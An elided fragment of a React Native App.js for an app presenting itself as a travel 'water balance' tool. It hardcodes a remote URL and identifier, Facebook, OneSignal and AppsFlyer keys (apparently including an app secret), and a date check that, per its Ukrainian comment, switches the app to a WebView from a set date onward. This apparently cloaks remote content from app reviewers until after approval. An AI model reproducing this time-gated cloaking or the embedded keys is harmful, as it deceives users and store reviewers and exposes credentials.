...
import StarWaterBalancProdScr from './Components/StarWaterBalancProdScr';
...
export default function App() {
  ...
  const [timeStampUserId, setTimeStampUserId] = useState(null);
  ...
  const INITIAL_URL = `https://epic-ceremonial-glee.space/`;
  const URL_IDENTIFAIRE = `hKo8vTU1`;
      ...
      if (jsonData !== null) {
        ...
        const results = await Promise.all([
          FBDeepLink.initialize(
            '1137646735070633',
            '7745eeaf9ba1b2a891d954482dc06ad0',
          ),
  ...
  OneSignal.initialize('c89ffa5a-0e59-47b1-b628-a79971aebb30');
        ...
        appsFlyer.initSdk(
          {
            ...
            appId: 'com.journey.star.australia.travel.riverwaterbalance',
            isDebug: true,
  ...
  useEffect(() => {
    ...
    const targetData = new Date('2025-06-29T12:00:00'); //дата з якої поч працювати webView
      ...
      return (
        <Stack.Navigator>
          <Stack.Screen
            ...
            name="StarWaterBalancProdScr"
            component={StarWaterBalancProdScr}
